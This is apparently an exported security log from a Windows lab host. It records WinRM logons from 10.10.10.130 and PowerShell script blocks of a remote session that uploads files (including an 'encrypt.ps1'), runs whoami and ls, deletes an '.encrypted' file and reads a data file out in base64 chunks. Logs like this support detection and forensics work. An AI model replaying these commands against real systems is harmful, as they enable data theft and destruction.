C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:24:20.316+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_50rwzxld.4mh.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_50rwzxld.4mh.ps1","null
null"
"2025-11-16T07:24:20.565+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""37e238e7b8049f3927512a101bd4af1b5db60fa8"" = @{
    ""target"" = ""C:\Program Files\data_important.txt"";
    ""src_basename"" = ""data_important.txt"";
    ""dst"" = ""C:\Program Files\data_important.txt""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""37e238e7b8049f3927512a101bd4af1b5db60fa8"" = @{
    ""target"" = ""C:\Program Files\data_important.txt"";
    ""src_basename"" = ""data_important.txt"";
    ""dst"" = ""C:\Program Files\data_important.txt""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:20.570+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T07:24:20.582+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T07:24:20.587+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T07:24:20.694+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:20.756+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('RGF5IGxhIGR1IGxpZXUgcXVhbiB0cm9uZyBjdWEgY29uZyB0eSAhIHZ1aSBsb25nIGtob25nIHBoYXQgdGFuIHJhIGJlbiBuZ29haS4=')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('RGF5IGxhIGR1IGxpZXUgcXVhbiB0cm9uZyBjdWEgY29uZyB0eSAhIHZ1aSBsb25nIGtob25nIHBoYXQgdGFuIHJhIGJlbiBuZ29haS4=')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:20.792+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:24:20.821+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:38.119+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T07:34:38.158+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:34:38.597+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_s43ei20t.ndx.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_s43ei20t.ndx.ps1","null
null"
"2025-11-16T07:34:39.128+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:42.450+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T07:34:42.482+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:34:42.583+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_jkkmyfsx.jzm.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_jkkmyfsx.jzm.ps1","null
null"
"2025-11-16T07:34:42.815+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:45.711+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:47.750+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","whoami
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
whoami
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:54.029+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:55.288+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:34:55.403+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_nvxrfplq.xa3.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_nvxrfplq.xa3.ps1","null
null"
"2025-11-16T07:34:59.824+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:06.581+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files
'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files
'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:09.877+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:22.607+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","rm data_important.txt.encrypted

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm data_important.txt.encrypted

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:29.413+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat data_important.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:41.721+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-item 'C:\Program Files\data_important.txt').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-item 'C:\Program Files\data_important.txt').length
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:41.752+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:35:41.849+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xrd1yhwo.uxn.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_xrd1yhwo.uxn.ps1","null
null"
"2025-11-16T07:35:42.077+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 0
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:42.209+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:35:42.301+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_wwtczvvc.4mf.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_wwtczvvc.4mf.ps1","null
null"
"2025-11-16T07:35:42.533+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 77
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$p = $ExecutionContext.SessionState.Path
$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
$index = 77
$chunkSize = 1048576
if (Test-Path $path -PathType Leaf) {
  $file = [System.IO.File]::OpenRead($path)
  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
  $chunk = New-Object byte[] $chunkSize
  $bytesRead = $file.Read($chunk, 0, $chunkSize)
  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
  Write-Host $bytes
  exit 0
}
ElseIf (Test-Path $path -PathType Container) {
  exit 2
}
exit 1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:42.669+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:54.491+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T07:35:54.585+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_t5l40wq2.sue.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_t5l40wq2.sue.ps1","null
null"
"2025-11-16T07:35:54.812+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:54.817+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T07:35:54.852+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T07:35:54.858+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
